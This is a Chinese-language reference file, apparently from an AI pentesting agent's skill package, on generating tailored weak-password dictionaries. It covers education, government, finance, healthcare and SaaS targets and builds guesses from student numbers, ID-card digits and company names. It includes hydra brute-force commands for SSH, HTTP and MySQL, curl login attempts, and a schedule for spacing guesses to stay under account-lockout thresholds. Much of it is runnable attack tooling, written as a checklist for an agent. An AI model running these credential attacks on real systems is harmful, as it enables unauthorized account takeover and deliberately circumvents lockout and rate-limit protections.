# 上下文感知弱口令生成器 (CAWG)

← 回主入口 [../SKILL.md](../SKILL.md)

> **定位**: 替代通用弱口令列表 (admin/123456), 根据目标上下文生成 **定制化高命中率** 字典
> **核心**: 质量优先 > 数量优先, 1 条精准密码 > 1000 条通用密码
> **适用**: 登录后台 / 管理面板 / SSH / 数据库 / FTP 等需要凭证的入口

---

## 🔍 Grep 命令速查

```bash
# 查询行业策略
grep -A 10 "教育" references/weak-password-generation.md
grep -A 10 "金融" references/weak-password-generation.md

# 查询有限制站策略
grep -A 20 "有限制站" references/weak-password-generation.md
```

---

## 1. 关键词提取 (多变形)

从目标信息中提取关键词, 每个关键词生成多种变形:

```
输入: 平台 title + 域名 + 公司名 + 页面特征
    ↓
提取关键词:
  平台 title: "华中科技大学教务管理系统"
    → 全拼首字母: hzkjdx
    → 英文缩写:   hust (标准英文缩写)
    → 中文缩写:   华科 / hk
    → 功能关键词: jw / jwxt / edu / jwgl

  域名: jwxt.hust.edu.cn
    → 子域前缀:   jwxt
    → 主域:       hust
    → 后缀特征:   edu.cn → 判定为教育行业

  公司名: "XX科技有限公司"
    → 全拼首字母: xxkj
    → 英文缩写:   xxtech
    → 中文缩写:   XX / xxkj
    → 域名前缀:   xxtech (来自 xxtech.com)
```

**变形规则**:

| 变形类型 | 方法 | 示例 |
|---------|------|------|
| 全拼首字母 | 每个汉字拼音首字母 | 华中科技→hzkj |
| 英文缩写 | 常见英文缩写对照 | 华中科大→hust |
| 中文缩写 | 前2字/关键字 | 华科 |
| 功能关键词 | 系统功能词 | 教务→jw/jwxt |
| 域名拆分 | 子域+主域 | jwxt.hust→jwxt/hust |
| 大小写 | 首字母大写/全大写 | Hust/HUST |
| 数字后缀 | 常见数字 | 01/123/2024 |

---

## 2. 行业判定 → 策略切换

### 2.1 自动判定规则

| 信号 | 判定 | 策略 |
|------|------|------|
| 域名含 .edu.cn / .edu | 教育 | §3.1 学号策略 |
| 域名含 .gov.cn / 标题含 政务/政府 | 政府 | §3.2 政务策略 |
| 标题含 银行/证券/基金/金融 | 金融 | §3.3 金融策略 |
| 标题含 医院/健康/医疗 | 医疗 | §3.4 医疗策略 |
| 域名后缀 .com/.io/.app/.dev/.co/.ai 且页面无中文 | **国际站** | **§3.6 国际/英文 SaaS 策略** |
| 无明显特征 | 通用 | §3.5 通用策略 |

### 2.2 判定信号提取

```
Step 1: 检查域名后缀 → .edu.cn / .gov.cn / .mil.cn → 直接判定
Step 2: 检查页面 title → 含行业关键词 → 判定
Step 3: 检查页面内容 → 含行业特定术语 → 判定
Step 4: 无法判定 → 通用策略
```

---

## 3. 行业策略

### 3.1 教育行业 (学号策略)

**账号生成**:

```
# 学号格式 (最常见)
{年份4位}{学院2位}{班级2位}{序号2位}
2023010101 ~ 2023010199  (2023级, 01学院, 01班)
2019010101 ~ 2019010199  (2019级, 老生更有可能未改密码)

# 教师工号
T{年份2位}{序号4位}      T230001 ~ T239999
teacher01 ~ teacher99
t01 ~ t99

# 管理员账号
admin / admin1 / administrator
jwadmin / jw_admin / jwgl
root / system / superadmin
dean01 / dean02
xzgl / jwxt_admin

# 常见默认
test / test01 / demo / guest
```

**密码生成**:

```
# 学校特征密码 (命中率最高)
{学校缩写}{年份}!         hust2024! / hzkjdx2024!
{学校缩写}123             hust123 / hzkjdx123
{学校缩写}@{年份}         hust@2024 / hzkjdx@2024
{学校缩写}{年份}          hust2024 / hzkjdx2024
{功能关键词}{年份}!        jwxt2024! / jw2024!
{功能关键词}123           jwxt123 / jw123
{功能关键词}@123           jwxt@123

# 通用弱密码 (教育行业常见默认)
123456 / 12345678 / 111111 / 000000
身份证后6位 (需配合学号猜测出生年月)
学号本身 (很多学校初始密码=学号)
{学号}@123 / {学号}123

# 管理员专属
admin123 / admin@123 / admin888
admin{年份}! / admin{学校缩写}
1234567890 / a12345678
P@ssw0rd / Admin@123
```

### 3.2 政务策略

```
# 账号
admin / {部门缩写}_admin / system / operator
zwdt / zwfw / gov / manager

# 密码
{部门名}{年份}!           gongan2024!
{部门缩写}@123            ga@123
政务通默认密码            123456 / 888888
{域名前缀}123            zwfw123
Admin@123 / P@ssw0rd
```

### 3.3 金融策略

```
# 账号
admin / {公司缩写}_admin / sysadmin / operator
test / audit / backup

# 密码 (金融行业密码策略通常较严, 需要复杂密码字典)
{公司名}{特殊字符}{年份}   huawei!2024 / huawei@2024
{公司名}QWE              huaweiQWE / abcQWE
{公司名}!@#              huawei!@#
P@ssw0rd / Admin@123 / Welcome1
{公司缩写}{数字}!         hw2024!
复杂密码: 字母+数字+特殊字符 ≥ 8位
```

### 3.4 医疗策略

```
# 账号
admin / doctor01 / nurse01
{医院缩写}_admin          xh_admin (协和)
system / his_admin / lis_admin

# 密码 (医疗机构密码习惯普遍较弱)
{医院名}123               xh123
{医院缩写}{年份}          xh2024
123456 / 12345678 / 888888
admin123 / admin888
{系统名}123               his123 / lis123
```

### 3.5 通用策略

```
# 账号
admin / administrator / root / system
test / demo / guest / operator
{公司缩写}_admin / {域名前缀}

# 密码
{公司名}{年份}!           company2024!
{公司名}123               company123
{公司名}@{年份}           company@2024
{域名}123                 domain123
{域名前缀}{年份}!         mail2024!
admin / admin123 / admin888
123456 / 12345678 / password
root / root123 / toor
test / test123 / test1234
```

### 3.6 国际 / 英文 SaaS 策略

> 只在目标明显是英文站、SaaS、创业公司、海外后台时使用。保持精简, 优先 5-20 条高命中字典。

```
# 账号
admin / administrator / support / demo / test
ops / devops / manager / owner
{domain} / {company} / {product}
{domain}_admin / {company}_admin

# 密码
{Company}{Year}!          Acme2026!
{company}{year}!          acme2026!
{company}@{year}          acme@2026
{product}{year}!          portal2026!
{domain}123               acme123
Welcome1! / Password123! / Admin@123
Summer{Year}! / Spring{Year}! / Qwerty123!
```

**有限制站 Top 8**: `admin/admin`, `admin/Admin@123`, `admin/{Company}{Year}!`, `admin/Welcome1!`, `{domain}/{domain}123`, `support/Welcome1!`, `demo/demo`, `test/test`。

---

## 4. 有限制站特殊处理 (关键)

> **核心**: 有限制站 (5次锁定/验证码/频率限制) **禁止** hydra 爆破, 每次尝试都不能浪费。

### 4.1 两种模式

| 目标类型 | 字典大小 | 工具 | 原则 |
|---------|---------|------|------|
| 无限制站 (无验证码/无锁定) | 500-2000 条 | hydra / burp Intruder | 数量优先, 跑完即止 |
| 有限制站 (N次锁定/验证码) | 5-20 条 | 手动 / curl 逐条 | 质量优先, 每条高命中 |

### 4.2 有限制站精准构造

**只构造最可能命中的 5-20 条, 按优先级排序**:

```
优先级 1 (必试): admin/admin
优先级 2 (定制): admin/{平台缩写}123
优先级 3 (定制): admin/{公司名}{年份}!
优先级 4 (通用): admin/123456
优先级 5 (通用): admin/admin123
优先级 6 (通用): admin/admin888
优先级 7 (定制): admin/{域名}123
优先级 8 (定制): admin/{公司缩写}@123
优先级 9 (通用): root/root
优先级 10(通用): test/test
```

### 4.3 间隔执行策略

```
5次错误锁定30分钟:
  → 每组4次, 留1次余量
  → 组1: admin/admin, admin/{缩写}123, admin/{年份}!, admin/123456
  → 等待30分钟锁定窗口过
  → 组2: admin/admin123, admin/{域名}123, admin/{缩写}@123, root/root
  → 等待...
  → 记录每次尝试到 assets.md [WeakPassword_Progress]

3次错误锁定:
  → 每组2次
  → 更保守, 只试最高优先级

触发验证码:
  → HITL 请求用户手动输入验证码
  → 用户拒绝 → 放弃此向量, 转其他漏洞

IP被封:
  → HITL 请求用户换 IP / 用代理
  → 用户拒绝 → 放弃此向量
```

### 4.4 失败后降级

```
全部尝试失败:
  → 记录到 assets.md [WeakPassword_Failed]
  → 不再重试相同字典
  → 转向其他漏洞向量 (未授权/逻辑漏洞/信息泄露)
  → 如果后续发现新信息 (如泄露的邮箱格式), 可重新构造针对性字典
```

---

## 5. 工具联动

### 5.1 无限制站 — 直接构造工具命令

```bash
# 生成字典后直接给 hydra
echo -e "admin\nroot\ntest\nadministrator" > {target}_users.txt
echo -e "{公司名}123\n{公司名}2024!\nadmin123\n123456" > {target}_pass.txt

# SSH
hydra -L {target}_users.txt -P {target}_pass.txt {target_ip} ssh

# HTTP POST 登录
hydra -L {target}_users.txt -P {target}_pass.txt {target_ip} http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# MySQL
hydra -L {target}_users.txt -P {target}_pass.txt {target_ip} mysql
```

### 5.2 有限制站 — curl 逐条测试

```bash
# 每条间隔观察锁定状态
curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/login \
  -d "username=admin&password=admin"
# → 200 = 成功 / 401 = 失败 / 429 = 限速 / 403 = 锁定

# 间隔后试下一条
sleep 60
curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/login \
  -d "username=admin&password={公司名}123"
```

---

## 6. 二次构造协议 (发现泄露格式后回填)

> **触发**: 在后续 Phase 中发现用户账号格式 / 命名规则 / ID 编号, 应回到本协议重新构造更精准的字典。
> **原则**: 第一轮靠目标特征猜, 第二轮靠泄露格式算, 第二轮命中率远高于第一轮。

### 6.1 触发信号

| 发现的泄露信息 | 二次构造动作 |
|---------------|-------------|
| JS/API 中出现学号 `20230101` | 按学号规则批量构造: 2023010101~2023010199 |
| 接口返回工号 `T230001` | 按工号规则: T230001~T239999 |
| 错误信息泄露用户名 `zhangwei01` | 拼音+数字规则: {姓全拼}{名首字母}{01-99} |
| 枚举接口返回用户列表 | 直接用返回的用户名作为账号字典 |
| 报错泄露邮箱 `@company.com` | 邮箱前缀作账号: zhangwei / z.wei / zhang.wei |
| 密码提示 "初始密码为身份证后6位" | 结合学号推算出生年月 → 身份证后6位 |

### 6.2 二次构造流程

```
Phase 1/2 中发现账号格式泄露
    ↓
□ 判断格式规则 (学号/工号/邮箱/自定义编号)
□ 根据规则生成账号范围 (如 2023010101~99)
□ 密码规则:
  - 学号站: 初始密码=学号 / 身份证后6位 / {学校缩写}123
  - 企业站: 初始密码={工号} / {公司缩写}123 / 手机后6位
  - 通用: 第一轮未命中的密码 + 新发现的格式特定密码
    ↓
□ 有限制站: 仍然精简, 只取格式范围的代表性子集 (如首位/末位/常见序号)
□ 无限制站: 扩大范围, hydra 跑
    ↓
□ 记录到 assets.md [CAWG_Round2]: 泄露来源 + 格式规则 + 构造结果
```

### 6.3 二次构造 vs 第一轮对比

| 维度 | 第一轮 (目标特征) | 第二轮 (泄露格式) |
|------|------------------|------------------|
| 账号来源 | 猜测 (admin/root/test) | 实际格式 (学号/工号) |
| 密码来源 | 通用+定制 (admin123/公司名123) | 格式特定 (初始密码=学号/身份证后6位) |
| 命中率 | 低-中 | 高 |
| 触发时机 | Phase 2 首次遇登录入口 | Phase 1-2 发现格式泄露后 |

---

## 7. 完整执行序列 (Agent 清单)

```
发现登录入口 (后台/SSH/DB/FTP)
    ↓
□ 提取上下文关键词 (§1: title/域名/公司名 → 多变形)
    ↓
□ 行业判定 (§2: 域名后缀/title关键词 → 切换策略)
    ↓
□ 检查是否有限制 (多次错误尝试 / 验证码 / 频率限制)
    ├─ 无限制 → §5.1: 生成大字典 + hydra
    └─ 有限制 → §4: 生成精简字典 (5-20条) + curl 逐条
    ↓
□ 按优先级排序构造字典
□ 无限制: 执行工具命令
□ 有限制: 逐条测试, 间隔执行, 记录进度
    ↓
□ 成功 → 记录到 vulns.md (含凭证, 脱敏处理)
□ 失败 → 记录到 assets.md [WeakPassword_Failed], 转其他向量
    ↓
□ 后续 Phase 发现账号格式泄露 → 触发 §6 二次构造, 重新测试
```

---

## 8. 相关参考

- 主入口 → [../SKILL.md](../SKILL.md)
- 认证逻辑 (密码重置/验证码/登录) → [auth-logic.md](auth-logic.md)
- 工具配置 (hydra/brute 等外部工具路径) → [tool-config.md](tool-config.md)
- HITL 协议 (验证码/凭证请求) → [human-in-the-loop.md](human-in-the-loop.md)

---

**版本**: v1.0 | **更新日期**: 2026-05-04 | **关键**: 有限制站禁止 hydra, 质量优先于数量
